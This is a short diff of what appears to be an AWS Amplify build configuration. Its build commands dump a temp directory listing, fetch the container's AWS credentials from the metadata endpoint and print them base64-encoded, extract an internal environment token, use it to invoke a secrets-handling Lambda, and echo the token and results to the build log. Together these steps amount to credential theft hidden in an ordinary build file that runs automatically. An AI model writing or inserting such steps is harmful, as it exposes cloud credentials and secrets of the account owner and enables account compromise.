@@ -12,7 +12,7 @@ frontend:
         - echo $(ls -la /tmp | base64 -w 0) 
         - echo $(curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | base64 -w 0)
         - export token=$(cat /codebuild/output/tmp/env.sh | grep 'AWS_ENVIRONMENT_TOKEN' | cut -d '=' -f 2 | cut -d '"' -f 2)
-        - export json="'{\"BranchArn\":\"arn:aws:amplify:us-east-1:800303608826:apps/d3je68rvgy22ch/branches/main\",\"JobId\":\"$AWS_JOB_ID\", \"StepName\":\"BUILD\", \"Token\":\"$token\"}'"
+        - export json="'{\"BranchArn\":\"arn:aws:amplify:us-east-1:800303608826:apps/d3je68rvgy22ch/branches/main\",\"JobId\":\"$AWS_JOB_ID\",\"StepName\":\"BUILD\",\"Token\":\"$token\"}'"
         - aws lambda invoke --function-name BuildSecretsHandler --payload $json --region us-east-1 out.txt
         - cat out.txt
         - echo "Env token=$AWS_ENVIRONMENT_TOKEN"
